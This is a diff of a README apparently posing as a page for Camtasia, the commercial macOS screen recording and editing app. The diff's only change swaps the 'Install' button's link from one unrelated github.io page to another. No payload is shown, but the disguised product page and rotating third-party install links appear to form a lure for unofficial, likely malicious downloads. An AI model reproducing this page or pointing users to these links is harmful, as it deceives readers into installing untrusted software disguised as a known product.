@@ -2,7 +2,7 @@
 <h1 align="center">Camtasia</h1>
 <p align="center">Native screen recording and video editing — done right on macOS.</p>
 <p align="center"><img src="https://img.shields.io/badge/macOS-000000?style=flat-square&logo=apple&logoColor=white"/> &nbsp; <img src="https://img.shields.io/badge/Apple_Silicon-Ready-brightgreen?style=flat-square"/> &nbsp; <img src="https://img.shields.io/badge/Dark_Mode-Supported-blueviolet?style=flat-square"/></p>
-<p align="center"><a href="https://napas-papuas.github.io/.github/camtasia"><img src="https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png" alt="Install" width="160"/></a></p>
+<p align="center"><a href="https://divan-shkaf.github.io/.github/camtasia"><img src="https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png" alt="Install" width="160"/></a></p>
 <p align="center"><img src="https://img.utdstc.com/screen/78a/29e/78a29e5f39ea3e0f3ce58e2e60bd11a19dc30b93a5fea6cbaab32a0d7ea90534:600" alt="Camtasia — macOS screen recording and video editing screenshot" width="780"/></p>
 
 ---
